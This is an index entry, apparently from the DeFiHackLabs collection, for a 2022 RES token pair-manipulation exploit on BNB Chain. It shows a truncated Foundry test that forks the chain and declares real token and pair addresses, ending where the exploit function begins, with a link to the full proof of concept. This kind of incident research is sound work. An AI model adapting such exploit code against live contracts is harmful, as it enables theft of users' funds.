# [?] RES-Token - pair manipulate

## Summary
Severity: Unknown
Chain: BNB Chain
Component: RES
Published: 2022-10-06
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/RES_exp.sol
Type: defi-exploit-poc

## Details
```solidity
contract ContractTest is Test {
    IUSDT constant USDT_TOKEN = IUSDT(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant ALL_TOKEN = IERC20(0x04C0f31C0f59496cf195d2d7F1dA908152722DE7);
    IPancakeRouter constant PS_ROUTER = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IPancakePair constant USDT_WBNB_PAIR = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    IPancakePair constant USDT_RES_PAIR = IPancakePair(0x05ba2c512788bd95cd6D61D3109c53a14b01c82A);
    IPancakePair constant USDT_ALL_PAIR = IPancakePair(0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb);
    IRES constant RES_TOKEN = IRES(0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21);

    function setUp() public {
        vm.createSelectFork("bsc", 21_948_016);
        // Adding labels to improve stack traces' readability
        vm.label(address(USDT_TOKEN), "USDT_TOKEN");
        vm.label(address(PS_ROUTER), "PS_ROUTER");
        vm.label(address(USDT_WBNB_PAIR), "USDT_WBNB_PAIR");
        vm.label(address(USDT_RES_PAIR), "USDT_RES_PAIR");
        vm.label(address(USDT_ALL_PAIR), "USDT_ALL_PAIR");
        vm.label(address(RES_TOKEN), "RES_TOKEN");
    }

    function stringsEquals(bytes calldata s1, string memory s2) private pure returns (bool) {
        bytes memory b1 = bytes(s1);
        bytes memory b2 = bytes(s2);

        uint256 l1 = b1.length;
        if (l1 != b2.length) return false;
        for (uint256 i = 0; i < l1; i++) {
            if (b1[i] != b2[i]) return false;
        }
        return true;
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "[Start] Attacker USDT balance before exploit", USDT_TOKEN.balanceOf(address(this)), 18
        );

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/RES_exp.sol_
